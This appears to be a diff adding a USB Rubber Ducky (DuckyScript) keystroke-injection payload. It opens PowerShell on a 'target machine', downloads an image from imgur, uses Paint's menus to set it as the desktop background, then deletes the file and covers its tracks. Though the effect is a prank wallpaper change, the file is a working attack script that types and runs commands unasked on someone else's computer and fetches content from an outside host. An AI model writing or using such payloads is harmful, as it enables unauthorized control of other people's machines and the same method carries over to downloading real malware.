@@ -1,0 +1,31 @@
+REM adjust timings to match your target machine
+REM replace the URL to your desired image URL
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell
+DELAY 300
+ENTER
+DELAY 1300
+STRING (New-Object System.Net.WebClient).DownloadFile
+STRING ("https://i.imgur.com/umKlSOf.jpg", "$home\Pictures\1hack.jpg");
+SPACE
+STRING mspaint.exe $home\Pictures\1hack.jpg;
+SPACE
+STRING exit
+ENTER
+DELAY 1600
+ALT f
+DELAY 500
+STRING b
+DELAY 500
+ALT f
+DELAY 500
+STRING x
+DELAY 300
+GUI r
+DELAY 400
+STRING powershell Remove-Item -Path "$home\Pictures\1hack.jpg"
+ENTER
+DELAY 400
+GUI d
